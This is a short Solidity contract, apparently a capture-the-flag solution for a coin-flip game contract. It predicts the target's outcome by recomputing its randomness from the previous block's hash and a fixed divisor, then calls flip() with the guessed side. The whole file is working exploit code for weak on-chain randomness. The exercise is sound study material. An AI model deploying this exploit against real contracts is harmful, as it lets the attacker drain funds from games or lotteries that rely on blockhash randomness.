pragma solidity ^0.8.4;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipProxy {
    address targetAddr;

    constructor(address _targetAddr) {
        targetAddr = _targetAddr;        
    }

    function guess() public {
        ICoinFlip target = ICoinFlip(targetAddr);

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool retval = target.flip(side);
        require(retval, "cannot guess");
    }
}